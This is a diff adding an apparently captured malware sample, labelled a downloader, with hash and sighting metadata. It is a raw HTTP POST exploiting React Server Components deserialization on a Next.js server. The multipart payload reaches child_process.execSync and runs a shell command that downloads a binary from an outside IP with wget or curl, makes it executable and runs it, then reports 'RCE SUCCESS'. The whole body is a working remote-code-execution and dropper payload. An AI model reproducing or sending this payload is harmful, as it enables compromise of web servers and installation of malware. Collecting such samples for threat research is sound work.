@@ -1,0 +1,44 @@
+# sha256: 506d27203804db37282a9cbc8d622ade783661223f080e24e68e7297910f2021
+# family: downloader
+# kind: script
+# size_bytes: 1613
+# first_seen: 2026-09-01 22:48:05.697318 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+POST / HTTP/1.1
+Host: 190.179.130.96:3001
+User-Agent: Mozilla/5.0
+Content-Length: 1373
+Accept: */*
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryReactCVE
+Next-Action: x
+Accept-Encoding: gzip
+
+------WebKitFormBoundaryReactCVE
+Content-Disposition: form-data; name="0"
+
+"$1"
+------WebKitFormBoundaryReactCVE
+Content-Disposition: form-data; name="1"
+
+{"status":"resolved_model","reason":0,"_response":"$5","value":"{\"then\":\"$4:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}
+------WebKitFormBoundaryReactCVE
+Content-Disposition: form-data; name="2"
+
+"$@3"
+------WebKitFormBoundaryReactCVE
+Content-Disposition: form-data; name="3"
+
+""
+------WebKitFormBoundaryReactCVE
+Content-Disposition: form-data; name="4"
+
+[]
+------WebKitFormBoundaryReactCVE
+Content-Disposition: form-data; name="5"
+
+{"_bundlerConfig":{},"_chunks":"$2:_response:_chunks","_formData":{"get":"$4:constructor:constructor"},"_prefix":"(function(){\n        try {\n            var res = process.mainModule.require(\"child_process\").execSync(\"cd /tmp 2\u003e/dev/null || cd /dev/shm 2\u003e/dev/null || cd /; rm -f .f; (wget -q --no-check-certificate -O .f http://168.222.254.23:889/agustin51 || curl -k -s -o .f http://168.222.254.23:889/agustin51) \u0026\u0026 chmod +x .f \u0026\u0026 ./.f\").toString();\n            console.log(\"\\n[+] RCE RESULT:\\n\" + res);\n            throw new Error(\"[+] RCE SUCCESS: \" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//"}
+------WebKitFormBoundaryReactCVE--
